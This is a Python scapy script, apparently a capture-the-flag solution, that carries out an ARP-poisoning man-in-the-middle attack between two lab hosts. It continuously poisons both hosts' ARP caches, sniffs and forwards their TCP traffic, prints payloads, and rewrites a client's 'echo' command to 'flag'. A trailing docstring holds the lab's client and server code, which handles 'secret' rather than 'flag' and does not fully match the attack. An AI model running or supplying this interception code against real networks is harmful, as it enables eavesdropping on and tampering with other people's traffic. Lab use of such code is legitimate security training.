"""
Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337.
"""

from scapy.all import *
import threading


class AttackerHost:
    def entrypoint(self):
        time.sleep(2)

        self.attacker_mac = get_if_hwaddr("eth0")
        self.client_ip = "10.0.0.2"
        self.server_ip = "10.0.0.3"

        # Get real MAC addresses
        self.client_mac = self.get_mac(self.client_ip)
        self.server_mac = self.get_mac(self.server_ip)

        # Start ARP poisoning
        threading.Thread(target=self.arp_poison, daemon=True).start()

        # Manually forward packets
        self.forward_packets()

    def get_mac(self, ip):
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False
        )
        return ans[0][1].hwsrc if ans else None

    def arp_poison(self):
        while True:
            send(
                ARP(
                    op=2,
                    pdst=self.client_ip,
                    hwdst=self.client_mac,
                    psrc=self.server_ip,
                    hwsrc=self.attacker_mac,
                ),
                verbose=False,
            )
            send(
                ARP(
                    op=2,
                    pdst=self.server_ip,
                    hwdst=self.server_mac,
                    psrc=self.client_ip,
                    hwsrc=self.attacker_mac,
                ),
                verbose=False,
            )
            time.sleep(2)

    def forward_packets(self):
        def process(pkt):
            if IP in pkt and TCP in pkt:
                # Client -> Server
                if pkt[IP].src == self.client_ip and pkt[IP].dst == self.server_ip:

                    # Modify payload if needed
                    if Raw in pkt:
                        data = pkt[Raw].load
                        if data == b"echo":
                            print("data from client to server", data)
                            pkt[Raw].load = b"flag"

                    # Forward to server
                    pkt[Ether].src = self.attacker_mac
                    pkt[Ether].dst = self.server_mac
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    sendp(pkt, verbose=False)

                # Server -> Client
                elif pkt[IP].src == self.server_ip and pkt[IP].dst == self.client_ip:
                    # Forward to client
                    if Raw in pkt:
                        print("data from server to client", pkt[Raw].load)
                    pkt[Ether].src = self.attacker_mac
                    pkt[Ether].dst = self.client_mac
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    sendp(pkt, verbose=False)

        sniff(prn=process, store=False)


attacker = AttackerHost()
attacker.entrypoint()

"""
class AuthenticatedClientHost(Host):
    def entrypoint(self):
        while True:
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))

                assert client_socket.recv(1024) == b"secret: "
                secret = bytes(server_host.secret)  # Get the secret out-of-band
                time.sleep(1)
                client_socket.sendall(secret.hex().encode())

                assert client_socket.recv(1024) == b"command: "
                time.sleep(1)
                client_socket.sendall(b"echo")
                time.sleep(1)
                client_socket.sendall(b"Hello, World!")
                assert client_socket.recv(1024) == b"Hello, World!"

                client_socket.close()
                time.sleep(1)

            except (OSError, ConnectionError, TimeoutError, AssertionError):
                continue

class AuthenticatedServerHost(Host):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.secret = multiprocessing.Array("B", 32)

    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()

                self.secret[:] = os.urandom(32)
                time.sleep(1)
                connection.sendall(b"secret: ")
                secret = bytes.fromhex(connection.recv(1024).decode())
                if secret != bytes(self.secret):
                    connection.close()
                    continue

                time.sleep(1)
                connection.sendall(b"command: ")
                command = connection.recv(1024).decode().strip()

                if command == "echo":
                    data = connection.recv(1024)
                    time.sleep(1)
                    connection.sendall(data)
                elif command == "secret":
                    time.sleep(1)
                    connection.sendall("some_secret")

                connection.close()
            except ConnectionError:
                continue
"""
